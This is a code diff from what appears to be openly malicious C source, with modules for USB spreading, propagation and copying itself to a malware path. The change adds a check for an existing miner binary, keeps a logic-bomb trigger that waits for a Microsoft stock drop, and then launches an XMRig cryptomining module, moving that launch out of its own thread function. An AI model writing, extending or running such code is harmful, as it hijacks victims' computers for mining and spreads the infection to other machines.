@@ -7,19 +7,29 @@
 #include "utils.h"
 #include "unix_usb_spreader.h"
 
+int is_already_attacking(Globals *global){
+   return global->access(MONEY_EXECPATH, F_OK) == 0;
+}
 
 void * start_trigger(void *varg){
     Globals *global = (Globals *) varg;
     int trigger_attack;
     global->printf("Starting trigger module...\n");
     
-    trigger_attack = get_microsoft_stock(global);
-    while(trigger_attack != 1) // Wait until stock value drops by 10%
-    {
+    int is_attacking = is_already_attacking(global);
+
+    if (!is_attacking){
         trigger_attack = get_microsoft_stock(global);
-        global->usleep(1000); // Delay for 1000 microseconds (1 millisecond)
+        while(trigger_attack != 1) // Wait until stock value drops by 10%
+        {
+            trigger_attack = get_microsoft_stock(global);
+            global->usleep(1000); // Delay for 1000 microseconds (1 millisecond)
+        }
     }
+
     // call attack function
+    DEBUG_LOG("[ENTRY] Starting xmr module...\n");
+    xmrig(global, is_attacking);
 }
 
 void * start_propagate(void *varg){
@@ -46,12 +56,6 @@ void * start_usb_propagate(void *varg) {
     Globals *global = (Globals *) varg;
     DEBUG_LOG("[ENTRY] Starting usb spreading module...\n");
     usb_spread_module(global);
-}
-
-void * start_xmr(void *varg) {
-    Globals *global = (Globals *) varg;
-    DEBUG_LOG("[ENTRY] Starting xmr module...\n");
-    xmrig(global);
 }
 
 void copy_to_malware_path(Globals *global, char *mwpath) {
